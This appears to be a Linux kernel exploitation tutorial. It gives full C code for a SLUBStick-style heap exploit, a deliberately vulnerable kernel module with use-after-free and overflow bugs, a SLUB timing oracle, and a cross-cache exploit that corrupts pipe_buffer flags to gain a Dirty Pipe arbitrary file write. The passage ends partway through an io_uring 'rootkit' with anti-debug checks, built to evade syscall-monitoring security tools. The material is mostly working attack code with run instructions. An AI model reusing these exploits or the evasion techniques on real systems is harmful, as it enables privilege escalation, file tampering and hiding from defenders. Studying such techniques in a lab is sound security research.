Implement the SLUBStick technique for deterministic cross-cache attacks. This exercise expects a custom vulnerable kernel module loaded at `/dev/vulnerable`

```c
// slubstick.c
// Compile: gcc -O2 -fno-stack-protector slubstick.c -o slubstick
// Run: ./slubstick

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/xattr.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/prctl.h>
#include <linux/netlink.h>

#define IOCTL_ALLOC   0x1001
#define IOCTL_FREE    0x1002
#define IOCTL_WRITE   0x1003
#define IOCTL_READ    0x1004

#define TARGET_SIZE 256

struct read_req {
    int idx;
    void *buf;
};

int fd;
int victim_objs[128];
int victim_count = 0;

void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

int alloc_victim() {
    int idx = ioctl(fd, IOCTL_ALLOC, 0);
    if (idx >= 0) {
        victim_objs[victim_count++] = idx;
    }
    return idx;
}

void free_victim(int idx) {
    ioctl(fd, IOCTL_FREE, idx);
}

int read_victim(int idx, char *buf) {
    struct read_req req = { .idx = idx, .buf = buf };
    int ret = ioctl(fd, IOCTL_READ, &req);
    return ret;
}

int main() {

    printf("[*] Slubstick - Kernel UAF Exploit (UID: %d)\n\n", getuid());

    pin_cpu(0);

    fd = open("/dev/vulnerable", O_RDWR);
    if (fd < 0) {
        perror("[-] open");
        return 1;
    }

    printf("[1] Heap Feng Shui\n");
    for (int i = 0; i < 64; i++) alloc_victim();
    printf("    Allocated %d objects\n", victim_count);

    int freed = 0;
    for (int i = 0; i < victim_count; i += 2) {
        free_victim(victim_objs[i]);
        freed++;
    }
    printf("    Freed %d objects (indices: %d %d %d...)\n\n",
           freed, victim_objs[0], victim_objs[2], victim_objs[4]);

    printf("[2] Reclaiming freed slots\n");
    int reclaim_count = 0;
    for (int i = 0; i < 64; i++) {
        if (ioctl(fd, IOCTL_ALLOC, 0) >= 0) reclaim_count++;
    }
    printf("    Allocated %d new objects\n\n", reclaim_count);

    printf("[3] UAF Read\n");
    char buf[TARGET_SIZE];
    int idx = victim_objs[0];

    if (read_victim(idx, buf) == 0) {
        printf("    First 64 bytes:\n    ");
        for (int i = 0; i < 64; i++) {
            printf("%02x%c", (unsigned char)buf[i], (i+1)%16 ? ' ' : '\n');
            if ((i+1)%16 == 0 && i < 63) printf("    ");
        }
        printf("\n");
    }

    printf("[4] Simulating task_struct leak\n");
    char *write_buf = malloc(TARGET_SIZE + 0x80);
    if (!write_buf) {
        perror("malloc");
        close(fd);
        return 1;
    }
    memset(write_buf, 0, TARGET_SIZE + 0x80);
    *(int*)write_buf = idx;
    uint64_t *fake_task = (uint64_t*)(write_buf + 4);

    fake_task[0] = 0xffff888012340000ULL;  // task_struct
    fake_task[1] = 0xffff888012340100ULL;  // stack
    fake_task[4] = 0xffff888087650000ULL;  // mm
    fake_task[5] = 0xffff888087650000ULL;  // active_mm
    fake_task[6] = 0xffff888099880000ULL;  // real_cred
    fake_task[7] = 0xffff888099880000ULL;  // cred
    fake_task[8] = (uint64_t)getpid();
    fake_task[9] = (uint64_t)getpid();

    if (ioctl(fd, IOCTL_WRITE, write_buf) == 0) {
        printf("    Wrote fake task_struct\n");

        char leak_buf[TARGET_SIZE];
        if (read_victim(idx, leak_buf) == 0) {
            uint64_t *leaked = (uint64_t*)leak_buf;
            printf("    Leaked:\n");
            printf("      task_struct:  0x%016lx\n", leaked[0]);
            printf("      real_cred:    0x%016lx\n", leaked[6]);
            printf("      cred:         0x%016lx\n", leaked[7]);
            printf("      pid:          %lu\n\n", leaked[8]);
        }
    }
    free(write_buf);

    printf("[5] Simulating privilege escalation(as a task finish the exploit)\n");
    printf("    Current: UID=%d GID=%d\n", getuid(), getgid());

    char *cred_buf = malloc(TARGET_SIZE + 0x80);
    if (!cred_buf) {
        perror("malloc");
        close(fd);
        return 1;
    }
    memset(cred_buf, 0, TARGET_SIZE + 0x80);
    *(int*)cred_buf = idx;
    uint64_t *fake_cred = (uint64_t*)(cred_buf + 4);
    fake_cred[0] = 1;                    // usage
    fake_cred[1] = 0;                    // uid=0, gid=0
    fake_cred[2] = 0;                    // euid=0, egid=0
    fake_cred[3] = 0x000003ffffffffffULL; // all caps

    if (ioctl(fd, IOCTL_WRITE, cred_buf) == 0) {
        char verify_buf[TARGET_SIZE];
        if (read_victim(idx, verify_buf) == 0) {
            uint64_t *cred = (uint64_t*)verify_buf;
            printf("    UID/GID=0x%016lx, caps=0x%016lx\n\n", cred[1], cred[3]);
        }
    }
    free(cred_buf);

    printf("[*] Exploit demonstration complete!\n");
    printf("    Note: In a real exploit, this would:\n");
    printf("    - Spray pipe_buffer or msg_msg objects\n");
    printf("    - Overwrite adjacent object metadata\n");
    printf("    - Trigger arbitrary read/write primitives\n");
    printf("    - Escalate to root privileges\n\n");

    close(fd);

    // Exit immediately to avoid corruption side effects
    _exit(0);
}
```

Create a vulnerable kernel module with heap overflow for SLUBStick testing.

```c
// vuln_module.c
// Intentionally vulnerable kernel module for educational purposes
// Demonstrates UAF (Use-After-Free) vulnerability
// Compile: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
// Load: sudo rmmod vuln_module 2>/dev/null; sudo insmod vuln_module.ko

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/delay.h>

#define DEVICE_NAME "vulnerable"
#define IOCTL_ALLOC   0x1001
#define IOCTL_FREE    0x1002
#define IOCTL_WRITE   0x1003
#define IOCTL_READ    0x1004
#define IOCTL_RESET   0x1005

#define MAX_OBJECTS 4096
#define OBJECT_SIZE 1024  // Changed to match pipe_buffer array allocation

struct vuln_obj {
    char data[OBJECT_SIZE];
};

static struct vuln_obj *objects[MAX_OBJECTS];
static int next_free_slot = 0;
static DEFINE_SPINLOCK(vuln_lock);

static long vuln_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct vuln_obj *obj;
    int idx;
    unsigned long flags;

    // Allocate buffer on heap to avoid stack frame warning
    char *buf = NULL;

    switch (cmd) {
    case IOCTL_ALLOC:
        spin_lock_irqsave(&vuln_lock, flags);

        // Find next free slot
        if (next_free_slot >= MAX_OBJECTS) {
            spin_unlock_irqrestore(&vuln_lock, flags);
            pr_warn("Max objects reached\n");
            return -ENOMEM;
        }

        obj = kmalloc(sizeof(struct vuln_obj), GFP_ATOMIC);
        if (!obj) {
            spin_unlock_irqrestore(&vuln_lock, flags);
            return -ENOMEM;
        }

        memset(obj->data, 0x41, OBJECT_SIZE);
        idx = next_free_slot;
        objects[idx] = obj;
        next_free_slot++;

        spin_unlock_irqrestore(&vuln_lock, flags);

        return idx;

    case IOCTL_FREE:
        idx = (int)arg;

        spin_lock_irqsave(&vuln_lock, flags);
        if (idx < 0 || idx >= MAX_OBJECTS || !objects[idx]) {
            spin_unlock_irqrestore(&vuln_lock, flags);
            return -EINVAL;
        }

        kfree(objects[idx]);
        // VULNERABILITY: Don't NULL out the pointer - leave it dangling
        // This creates a Use-After-Free condition
        // objects[idx] = NULL;
        spin_unlock_irqrestore(&vuln_lock, flags);

        return 0;

    case IOCTL_WRITE:
        // VULNERABLE: Controlled heap overflow with UAF
        // Format: [4 bytes idx][4 bytes size][data]
        {
            struct {
                int idx;
                int size;
            } write_hdr;

            if (copy_from_user(&write_hdr, (void __user *)arg, sizeof(write_hdr)))
                return -EFAULT;

            // Limit overflow to prevent total system crash
            if (write_hdr.size < 0 || write_hdr.size > OBJECT_SIZE + 64) {
                pr_warn("vuln_module: Write size out of bounds: %d\n", write_hdr.size);
                return -EINVAL;
            }

            spin_lock_irqsave(&vuln_lock, flags);
            if (write_hdr.idx < 0 || write_hdr.idx >= MAX_OBJECTS) {
                spin_unlock_irqrestore(&vuln_lock, flags);
                return -EINVAL;
            }

            // VULNERABILITY: Write to potentially freed pointer (UAF)
            obj = objects[write_hdr.idx];
            spin_unlock_irqrestore(&vuln_lock, flags);

            // Don't check if obj is NULL - that's the vulnerability!

            // Allocate temporary buffer
            buf = kmalloc(write_hdr.size, GFP_KERNEL);
            if (!buf)
                return -ENOMEM;

            if (copy_from_user(buf, (void __user *)arg + sizeof(write_hdr), write_hdr.size)) {
                kfree(buf);
                return -EFAULT;
            }

            // VULNERABILITY: Controlled overflow - write up to size bytes
            {
                char *dst = (char *)obj;
                size_t i;

                // Manual copy to avoid fortify warnings
                for (i = 0; i < write_hdr.size; i++) {
                    dst[i] = buf[i];
                }
            }

            kfree(buf);
            return 0;
        }

    case IOCTL_READ:
        // VULNERABLE: UAF read
        // Format: [4 bytes idx][4 bytes size][8 bytes buf ptr]
        {
            struct {
                int idx;
                int size;
                void *buf;
            } read_req;

            if (copy_from_user(&read_req, (void __user *)arg, sizeof(read_req)))
                return -EFAULT;

            // Limit read size
            if (read_req.size < 0 || read_req.size > OBJECT_SIZE) {
                return -EINVAL;
            }

            spin_lock_irqsave(&vuln_lock, flags);
            if (read_req.idx < 0 || read_req.idx >= MAX_OBJECTS) {
                spin_unlock_irqrestore(&vuln_lock, flags);
                return -EINVAL;
            }

            // VULNERABILITY: Read from potentially freed pointer (UAF)
            obj = objects[read_req.idx];
            spin_unlock_irqrestore(&vuln_lock, flags);

            // Don't check if obj is NULL - that's the vulnerability!

            // Read the data (might be freed and reallocated)
            if (copy_to_user(read_req.buf, obj->data, read_req.size))
                return -EFAULT;

            return 0;
        }

    case IOCTL_RESET:
        // Reset module state (for testing)
        pr_info("vuln_module: Resetting state...\n");

        spin_lock_irqsave(&vuln_lock, flags);

        // Free all allocated objects
        for (idx = 0; idx < next_free_slot; idx++) {
            if (objects[idx]) {
                kfree(objects[idx]);
                objects[idx] = NULL;
            }
        }

        // Reset state
        next_free_slot = 0;
        memset(objects, 0, sizeof(objects));

        spin_unlock_irqrestore(&vuln_lock, flags);

        // Give SLUB time to process frees
        msleep(250);

        pr_info("vuln_module: Reset complete\n");
        return 0;

    default:
        return -EINVAL;
    }
}

static const struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = vuln_ioctl,
};

static struct miscdevice vuln_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = DEVICE_NAME,
    .fops = &vuln_fops,
    .mode = 0666,
};

static int __init vuln_init(void) {
    int ret;

    // Initialize state
    memset(objects, 0, sizeof(objects));
    next_free_slot = 0;

    ret = misc_register(&vuln_dev);
    if (ret) {
        pr_err("vuln_module: Failed to register device\n");
    } else {
        pr_info("vuln_module: Loaded successfully - /dev/%s\n", DEVICE_NAME);
        pr_info("vuln_module: WARNING - This module contains intentional vulnerabilities!\n");
    }
    return ret;
}

static void __exit vuln_exit(void) {
    int i;
    unsigned long flags;

    pr_info("vuln_module: Unloading...\n");

    // Unregister device first to prevent new operations
    misc_deregister(&vuln_dev);

    // Clean up all objects
    spin_lock_irqsave(&vuln_lock, flags);
    for (i = 0; i < MAX_OBJECTS; i++) {
        if (objects[i]) {
            kfree(objects[i]);
            objects[i] = NULL;
        }
    }
    next_free_slot = 0;
    spin_unlock_irqrestore(&vuln_lock, flags);

    // Give time for cleanup
    msleep(100);

    pr_info("vuln_module: Unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Vulnerable kernel module for exploitation testing");
```

and a makefile

```makefile
obj-m += vuln_module.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**Compile & Run:**

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
sudo rmmod vuln_module
sudo insmod vuln_module.ko
gcc -O2 -fno-stack-protector slubstick.c -o slubstick
./slubstick
```

### Timing Side-Channels for Heap State Inference

The SLUB allocator's fast path (per-cpu slab) and slow path (partial list / buddy allocator) have measurable timing differences (~50 cycles vs ~500+ cycles). By measuring `RDTSC` around kernel allocation syscalls (via a vulnerable ioctl), attackers can infer:

- When a slab is exhausted (timing spike = new slab from buddy allocator)
- How many objects remain in the current slab (count allocations between spikes)
- Whether specific pages have been recycled (timing pattern changes)

This oracle enables deterministic heap feng shui by revealing internal SLUB state without kernel memory access.

```c
// slub_timing_oracle.c
// SLUB allocator timing side-channel for heap state inference
// Compile: gcc -O2 slub_timing_oracle.c -o slub_timing
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <stdint.h>

static inline uint64_t rdtsc_serialized() {
    uint64_t lo, hi;
    __asm__ volatile ("lfence\nrdtsc\nlfence" : "=a"(lo), "=d"(hi));
    return (hi << 32) | lo;
}

#define IOCTL_ALLOC 0x1001
#define SPRAY_COUNT 2000
#define TIMING_THRESHOLD 5000

int main() {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    int fd = open("/dev/vulnerable", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[*] SLUB Timing Oracle\n");

    uint64_t timings[SPRAY_COUNT];
    uint64_t sum = 0;
    int boundaries = 0;

    for (int i = 0; i < SPRAY_COUNT; i++) {
        uint64_t start = rdtsc_serialized();
        ioctl(fd, IOCTL_ALLOC, 0x200);
        uint64_t end = rdtsc_serialized();

        timings[i] = end - start;
        sum += timings[i];

        if (i > 10 && timings[i] > TIMING_THRESHOLD) {
            printf("[!] Slab boundary at %d: %lu cycles\n", i, timings[i]);
            boundaries++;
        }
    }

    printf("[+] Average: %lu cycles\n", sum / SPRAY_COUNT);
    printf("[+] Detected %d slab boundaries (>%d cycles)\n", boundaries, TIMING_THRESHOLD);

    if (boundaries > 0) {
        printf("[*] Objects per slab (estimated): ~%d\n", SPRAY_COUNT / boundaries);
    } else {
        printf("[*] No clear slab boundaries detected (all allocations fast)\n");
    }

    printf("\n[*] Timing distribution (all %d allocations):\n", SPRAY_COUNT);
    int buckets[5] = {0};  // <2000, 2000-5000, 5000-10000, 10000-50000, >50000

    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (timings[i] < 2000) buckets[0]++;
        else if (timings[i] < 5000) buckets[1]++;
        else if (timings[i] < 10000) buckets[2]++;
        else if (timings[i] < 50000) buckets[3]++;
        else buckets[4]++;
    }

    printf("    <2000 cycles:      %4d (%.1f%%) - fast path (same slab)\n",
           buckets[0], 100.0 * buckets[0] / SPRAY_COUNT);
    printf("    2000-5000:         %4d (%.1f%%) - partial list\n",
           buckets[1], 100.0 * buckets[1] / SPRAY_COUNT);
    printf("    5000-10000:        %4d (%.1f%%) - new slab allocation\n",
           buckets[2], 100.0 * buckets[2] / SPRAY_COUNT);
    printf("    10000-50000:       %4d (%.1f%%) - buddy allocator\n",
           buckets[3], 100.0 * buckets[3] / SPRAY_COUNT);
    printf("    >50000:            %4d (%.1f%%) - page fault/contention\n",
           buckets[4], 100.0 * buckets[4] / SPRAY_COUNT);

    printf("\n[+] Timing oracle complete\n");
    printf("\n[*] Analysis:\n");
    if (boundaries > 5 && boundaries < 100) {
        printf("    - Detected %d slab boundaries\n", boundaries);
        printf("    - Estimated %d objects per slab\n", SPRAY_COUNT / boundaries);
        printf("    - SLUB allocator is creating new slabs periodically\n");
    } else if (boundaries <= 5) {
        printf("    - Very few slab boundaries detected\n");
        printf("    - Most allocations from same/partial slabs (good cache locality)\n");
    } else {
        printf("    - Too many boundaries detected (%d)\n", boundaries);
        printf("    - System may be under memory pressure\n");
    }
    printf("    - Use threshold >%d cycles to detect real slab boundaries\n", TIMING_THRESHOLD);

    close(fd);
    return 0;
}
```

**Compile & Run:**

```bash
gcc -O2 slub_timing_oracle.c -o slub_timing
./slub_timing
```

### Cross-Cache Attacks

Cross-cache attacks exploit page recycling between the SLUB allocator and buddy allocator. When all objects in a slab are freed, SLUB returns pages to the buddy allocator. If a different `kmem_cache` requests pages, it may receive the same physical pages — allowing objects of type A to overlap with type B in memory. This bypasses SLUB freelist hardening and slab isolation by operating at the page level. The goal is to overlap a vulnerable object (e.g., in `kmalloc-1024`) with an exploitation primitive (e.g., `pipe_buffer` array containing 32-byte structures with page pointers, ops pointers, and flags).

```c
// pipe_buffer_write.c
// gcc -o pipe_buffer_write pipe_buffer_write.c -Wall -Wextra -O2

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sched.h>
#include <errno.h>

#define SPRAY_OBJECTS 256
#define PIPES_COUNT 150

#define IOCTL_ALLOC   0x1001
#define IOCTL_FREE    0x1002
#define IOCTL_WRITE   0x1003
#define IOCTL_READ    0x1004
#define IOCTL_RESET   0x1005

#define PIPE_BUF_FLAG_CAN_MERGE 0x10

static int is_kernel_ptr(uint64_t ptr) {
    return (ptr > 0xffff000000000000ULL && ptr < 0xffffffffffffffffULL);
}

static int is_valid_pipe_buffer(char *data) {
    uint64_t page_ptr = *(uint64_t*)(data + 0);
    uint32_t buf_offset = *(uint32_t*)(data + 8);
    uint32_t len = *(uint32_t*)(data + 12);
    uint64_t ops_ptr = *(uint64_t*)(data + 16);
    uint32_t flags = *(uint32_t*)(data + 24);

    if (!is_kernel_ptr(page_ptr)) return 0;
    if (!is_kernel_ptr(ops_ptr)) return 0;
    if (buf_offset > 4096) return 0;
    if (len > 4096) return 0;
    if (flags > 0xFF) return 0;

    return 1;
}

int main() {
    int vuln_fd = -1;
    int pipes[PIPES_COUNT][2];
    int target_fd = -1;
    int indices[SPRAY_OBJECTS];
    int alloc_count = 0;
    int pipes_created = 0;
    int success = 0;

    for (int i = 0; i < PIPES_COUNT; i++) {
        pipes[i][0] = -1;
        pipes[i][1] = -1;
    }
    printf("[*] Technique Overview:\n");
    printf("    1. Allocate objects in kmalloc-1024\n");
    printf("    2. Free objects (UAF - pointers retained)\n");
    printf("    3. Spray pipes (pipe_buffer arrays in kmalloc-1024)\n");
    printf("    4. Use UAF to corrupt pipe_buffer\n");
    printf("    5. Trigger Dirty Pipe for arbitrary write\n\n");

    // Pin to CPU
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    printf("[+] Pinned to CPU 0\n");

    // Open device
    vuln_fd = open("/dev/vulnerable", O_RDWR);
    if (vuln_fd < 0) {
        perror("open /dev/vulnerable");
        return 1;
    }
    printf("[+] Opened /dev/vulnerable\n");

    // Reset with retry
    printf("[*] Resetting module state...\n");
    for (int retry = 0; retry < 3; retry++) {
        if (ioctl(vuln_fd, IOCTL_RESET, 0) == 0) {
            break;
        }
        if (retry < 2) {
            printf("    [*] Reset failed, retrying...\n");
            usleep(500000);
        } else {
            printf("[-] Reset failed after retries\n");
            goto cleanup;
        }
    }
    printf("[+] Module reset successful\n");
    usleep(200000);

    // Create target
    int ret;
    ret = system("rm -f /tmp/target_file 2>/dev/null");
    (void)ret;
    ret = system("echo 'AAAAAAAAAAAAAAAA' > /tmp/target_file");
    (void)ret;
    target_fd = open("/tmp/target_file", O_RDONLY);
    if (target_fd < 0) {
        perror("open target");
        goto cleanup;
    }
    printf("[+] Target file created\n\n");

    // Phase 1: Spray kmalloc-1024
    printf("[*] Phase 1: Spraying %d objects (kmalloc-1024)\n", SPRAY_OBJECTS);
    for (int i = 0; i < SPRAY_OBJECTS; i++) {
        int idx = ioctl(vuln_fd, IOCTL_ALLOC, 0);
        if (idx >= 0) {
            indices[alloc_count++] = idx;
        }
    }
    printf("[+] Allocated %d objects\n", alloc_count);
    usleep(50000);

    // Phase 2: Free to create holes
    printf("\n[*] Phase 2: Freeing objects (creating UAF)\n");
    for (int i = 0; i < alloc_count; i++) {
        ioctl(vuln_fd, IOCTL_FREE, indices[i]);
    }
    printf("[+] Freed %d objects (UAF pointers retained)\n", alloc_count);
    printf("[*] Waiting for SLUB to process frees...\n");
    usleep(300000);

    // Phase 3: Spray pipes
    printf("\n[*] Phase 3: Spraying %d pipes\n", PIPES_COUNT);
    printf("    [*] pipe_buffer arrays (kmalloc-1024) will reclaim freed slots\n");

    for (int i = 0; i < PIPES_COUNT; i++) {
        if (pipe(pipes[i]) == 0) {
            fcntl(pipes[i][0], F_SETFL, O_NONBLOCK);
            fcntl(pipes[i][1], F_SETFL, O_NONBLOCK);
            pipes_created++;
        }
    }
    printf("[+] Created %d pipes\n", pipes_created);

    // Splice
    printf("[*] Splicing target file into pipes\n");
    int spliced = 0;
    for (int i = 0; i < pipes_created; i++) {
        off_t offset = 0;
        if (splice(target_fd, &offset, pipes[i][1], NULL, 1, 0) == 1) {
            spliced++;
        }
    }
    printf("[+] Spliced %d pipes\n", spliced);

    if (spliced < 5) {
        printf("[-] Too few splices\n");
        goto cleanup;
    }

    usleep(100000);

    // Phase 4: Scan for UAF overlap
    printf("\n[*] Phase 4: Scanning for UAF overlap with pipe_buffer\n");
    int target_idx = -1;
    char leak_data[256];

    struct {
        int idx;
        void *buf;
    } read_req;

    int candidates = 0;
    for (int i = 0; i < alloc_count; i++) {
        memset(leak_data, 0, sizeof(leak_data));
        read_req.idx = indices[i];
        read_req.buf = leak_data;

        if (ioctl(vuln_fd, IOCTL_READ, &read_req) < 0) {
            continue;
        }

        if (is_valid_pipe_buffer(leak_data)) {
            uint32_t buf_offset = *(uint32_t*)(leak_data + 8);
            uint32_t len = *(uint32_t*)(leak_data + 12);

            if (buf_offset == 0 && len == 1) {
                candidates++;
                uint64_t page_ptr = *(uint64_t*)(leak_data + 0);
                uint64_t ops_ptr = *(uint64_t*)(leak_data + 16);
                uint32_t flags = *(uint32_t*)(leak_data + 24);

                printf("    [+] Candidate %d at idx %d:\n", candidates, indices[i]);
                printf("        page: 0x%016lx\n", page_ptr);
                printf("        ops:  0x%016lx\n", ops_ptr);
                printf("        flags: 0x%08x\n", flags);

                if (target_idx < 0) {
                    target_idx = indices[i];
                }
            }
        }

        if ((i + 1) % 128 == 0) {
            printf("    [*] Scanned %d/%d...\n", i + 1, alloc_count);
        }
    }

    if (target_idx < 0) {
        printf("\n[-] No UAF overlap found\n");
        goto cleanup;
    }

    printf("\n[+] SUCCESS! Found UAF overlap at idx %d\n", target_idx);
    printf("    [*] UAF pointer now points to pipe_buffer structure\n");

    // Phase 5: Corrupt pipe_buffer
    printf("\n[*] Phase 5: Corrupting pipe_buffer via UAF write\n");

    memset(leak_data, 0, sizeof(leak_data));
    read_req.idx = target_idx;
    read_req.buf = leak_data;
    if (ioctl(vuln_fd, IOCTL_READ, &read_req) < 0) {
        perror("ioctl READ");
        goto cleanup;
    }

    char payload[260];
    memset(payload, 0, sizeof(payload));
    *(int*)payload = target_idx;
    memcpy(payload + 4, leak_data, 256);

    uint32_t orig_flags = *(uint32_t*)(leak_data + 24);
    uint32_t new_flags = orig_flags | PIPE_BUF_FLAG_CAN_MERGE;
    *(uint32_t*)(payload + 4 + 24) = new_flags;

    printf("    [*] Setting PIPE_BUF_FLAG_CAN_MERGE\n");
    printf("    [*] Flags: 0x%08x -> 0x%08x\n", orig_flags, new_flags);

    if (ioctl(vuln_fd, IOCTL_WRITE, payload) < 0) {
        perror("ioctl WRITE");
        goto cleanup;
    }
    printf("[+] pipe_buffer flags modified via UAF!\n");

    // Phase 6: Trigger Dirty Pipe
    printf("\n[*] Phase 6: Triggering Dirty Pipe write\n");
    printf("    [*] Writing to pipe will merge into page cache\n");

    char *attack_payload = "PWNED!!!";
    int writes = 0;

    for (int i = 0; i < pipes_created; i++) {
        if (write(pipes[i][1], attack_payload, strlen(attack_payload)) > 0) {
            writes++;
        }
    }
    printf("[+] Wrote payload to %d pipes\n", writes);

    sync();
    usleep(100000);

    // Verify
    printf("\n[*] Phase 7: Verifying arbitrary file write\n");
    char verify_buf[64] = {0};
    int vfd = open("/tmp/target_file", O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = read(vfd, verify_buf, sizeof(verify_buf) - 1);
        (void)n; // Suppress warning
        close(vfd);

        printf("    Target file: \"%s\"\n", verify_buf);

        if (strstr(verify_buf, "PWNED!!!")) {
            success = 1;
            printf("[SUCCESS] Arbitrary file write achieved!\n");
        } else {
            printf("\n[-] Attack failed - file unchanged\n");
        }
    }

cleanup:
    printf("\n[*] Cleaning up...\n");

    if (target_fd >= 0) close(target_fd);

    // Close pipes in reverse order, carefully
    for (int i = pipes_created - 1; i >= 0; i--) {
        if (pipes[i][1] >= 0) close(pipes[i][1]);
        if (pipes[i][0] >= 0) close(pipes[i][0]);
    }

    usleep(200000);

    if (vuln_fd >= 0) close(vuln_fd);

    printf("[+] Cleanup complete\n");

    if (success) {
        printf("\n[*] Exploit demonstration complete!\n");
    }

    return success ? 0 : 1;
}
```

**Compile & Run:**

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
sudo rmmod vuln_module
sudo insmod vuln_module.ko
gcc -o pipe_buffer_write pipe_buffer_write.c -Wall -Wextra -O2
./pipe_buffer_write
```

### io_uring Exploitation (Syscall Bypass)

io_uring is a modern Linux kernel interface (introduced in kernel 5.1) for asynchronous I/O operations. It allows userspace programs to submit I/O operations to the kernel without making traditional syscalls, using shared memory rings instead. This creates a significant blind spot for security tools that rely on syscall monitoring (Falco, Sysdig, most EDRs). The ARMO security research team demonstrated this in April 2025 with the "Curing" rootkit proof-of-concept.

**Why io_uring Bypasses Security Tools:**

- Traditional security tools hook syscall entry points (`sys_call_table`, `do_syscall_64`)
- io_uring operations bypass these hooks entirely — they're processed directly by kernel workers
- Operations include: file read/write, network I/O, process spawning, file permission changes
- 61 different operation types (`IORING_OP_*`) provide full system control

**Attack Primitives:**

- File operations without `open()`/`read()`/`write()` syscalls
- Network connections without `socket()`/`connect()` syscalls
- Process spawning without `fork()`/`execve()` syscalls
- Privilege escalation without detectable syscall patterns

**Detection Challenges:**

- eBPF-based monitoring can't hook io_uring operations directly
- Kernel tracepoints for io_uring are limited and incomplete
- Memory-based detection requires kernel module or eBPF with BTF access
- Most EDR/XDR solutions are blind to io_uring activity

```c
// io_uring_rootkit.c
// Compile: gcc -O2 io_uring_rootkit.c -o curing -luring
// Run: ./curing

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <liburing.h>
#include <errno.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <sys/wait.h>

// --- Anti-Debug ---
static int IsBeingTraced() {
    char buf[256];
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    while (fgets(buf, sizeof(buf), f)) {
        if (strncmp(buf, "TracerPid:", 10) == 0) {
            int pid = atoi(buf + 10);
            fclose(f);
            return pid != 0;
        }
    }
    fclose(f);
    return 0;
}

// --- io_uring File Operations (No syscalls!) ---

// Read file using io_uring (bypasses open/read syscalls)
static int IoUringReadFile(const char *path, char *buffer, size_t size) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;

    // Initialize io_uring
    ret = io_uring_queue_init(8, &ring, 0);
    if (ret < 0) {
        fprintf(stderr, "[-] io_uring_queue_init failed: %s\n", strerror(-ret));
        return -1;
    }

    // Open file via io_uring (IORING_OP_OPENAT)
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0);
    sqe->user_data = 1; // Tag for open operation

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Wait for open completion
    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    int fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (fd < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Read file via io_uring (IORING_OP_READ)
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    struct iovec iov = {
        .iov_base = buffer,
        .iov_len = size
    };

    io_uring_prep_readv(sqe, fd, &iov, 1, 0);
    sqe->user_data = 2; // Tag for read operation

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Wait for read completion
    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    int bytes_read = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    // Close file via io_uring (IORING_OP_CLOSE)
    sqe = io_uring_get_sqe(&ring);
    if (sqe) {
        io_uring_prep_close(sqe, fd);
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        io_uring_cqe_seen(&ring, cqe);
    }

    io_uring_queue_exit(&ring);
    return bytes_read;
}

// Write file using io_uring (bypasses open/write syscalls)
static int IoUringWriteFile(const char *path, const char *data, size_t size) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;

    ret = io_uring_queue_init(8, &ring, 0);
    if (ret < 0) return -1;

    // Open file for writing
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        io_uring_queue_exit(&ring);
        return -1;
    }

